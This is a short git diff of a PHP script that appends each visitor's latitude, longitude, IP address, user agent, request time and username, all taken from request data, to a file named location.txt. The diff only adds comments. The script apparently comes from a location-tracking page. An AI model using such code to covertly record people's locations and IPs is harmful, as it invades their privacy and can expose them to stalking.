@@ -1,7 +1,7 @@
 <?php
 if($_GET["noName"]==0){
-$myfile = fopen("location.txt","a");
-$format="\n==================================================\n";
+$myfile = fopen("location.txt","a");  //open file in append mode
+$format="\n==================================================\n";  //formatting the output
 $format2="\n==================================================\n";
 $txt ="lat: ". $_GET["lat"] ."\nlon: ". $_GET["lon"]."\nIP: ". $_SERVER["REMOTE_ADDR"]."\nUserAgent:". $_GET["uagent"]."\nrequestTime: ".$_GET["date"];
 $uname="\nUserName:".$_GET["uname"]."\n";
